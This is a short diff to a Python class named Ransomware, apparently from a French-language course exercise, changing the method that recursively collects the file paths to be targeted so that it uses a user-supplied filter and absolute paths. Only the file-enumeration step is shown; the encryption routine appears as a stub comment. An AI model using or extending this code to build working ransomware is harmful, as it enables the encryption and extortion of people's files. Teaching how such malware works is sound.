@@ -35,9 +35,10 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
-        return sorted(Path('/').rglob('*.txt'))
-    #on remplace '.' par '/' pour parcourir la racine, on veut les .txt, 
-    #Sorted trie la list retournée
+        return sorted(str(file.resolve()) for file in Path('.').rglob(filter))
+        #J'ai changé le / en . mais j'ai ajouté resolve pour trouver le chemin aboslue, cela sera plus rapide que parcourir tous les fichiers avec /
+        #Je force les chemins absolues obtenues en chaine de caractère
+        #le filtre (.txt) dans notre cas pourra être écris par l'utilisateur (car paramètre de la fonction) ce qui donne une fonction plus globale
 
     def encrypt(self):
         # main function for encrypting (see PDF)
